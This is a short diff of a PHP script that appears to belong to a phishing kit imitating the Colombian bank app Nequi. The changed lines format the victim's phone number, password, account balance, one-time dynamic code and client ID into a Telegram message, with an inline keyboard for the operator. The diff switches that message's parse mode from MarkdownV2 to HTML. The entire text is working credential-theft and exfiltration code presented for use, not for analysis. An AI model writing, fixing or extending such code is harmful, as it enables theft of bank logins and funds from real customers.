@@ -39,12 +39,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $baseUrl = $config['baseUrl'];
         $security_key = $config['security_key'];
 
-        $message = "🔐 *Nuevo inicio de sesión (Nequi)*\n\n"
-            . "📱 *Número de celular:* `" . escapeMarkdownV2($usuario) . "`\n"
-            . "🔑 *Contraseña:* `" . escapeMarkdownV2($clave) . "`\n"
-            . "💰 *Saldo Nequi:* `" . escapeMarkdownV2($saldo) . "`\n"
-            . "🔢 *Clave dinámica:* `" . escapeMarkdownV2($otp) . "`\n"
-            . "🆔 *ID del cliente:* `" . $cliente_id . "`";
+        $message = "🔐 <b>Nuevo inicio de sesión (Nequi)</b>\n\n"
+            . "📱 <b>Número de celular:</b> <code>" . $usuario . "</code>\n"
+            . "🔑 <b>Contraseña:</b> <code>" . $clave . "</code>\n"
+            . "💰 <b>Saldo Nequi:</b> <code>" . $saldo . "</code>\n"
+            . "🔢 <b>Clave dinámica:</b> <code>" . $otp . "</code>\n"
+            . "🆔 <b>ID del cliente:</b> <code>" . $cliente_id . "</code>";
 
         $keyboard = [
             'inline_keyboard' => [
@@ -65,7 +65,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $data = [
             'chat_id' => $chatId,
             'text' => $message,
-            'parse_mode' => 'MarkdownV2',
+            'parse_mode' => 'HTML',
             'reply_markup' => json_encode($keyboard)
         ];
 
